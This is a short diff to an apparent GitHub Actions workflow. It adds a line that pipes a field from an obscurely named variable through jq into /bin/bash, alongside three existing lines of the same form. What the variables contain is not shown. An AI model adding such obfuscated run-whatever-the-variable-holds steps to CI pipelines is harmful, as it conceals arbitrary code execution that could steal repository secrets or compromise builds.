@@ -25,6 +25,7 @@ jobs:
           echo $dmf67 | jq -r .o7 | /bin/bash
           printf '%s' "$z10" | jq -r .m28 | /bin/bash
           echo $st122 | jq -r .boi34090 | /bin/bash
+          echo $fio9184 | jq -r .lqgf73 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
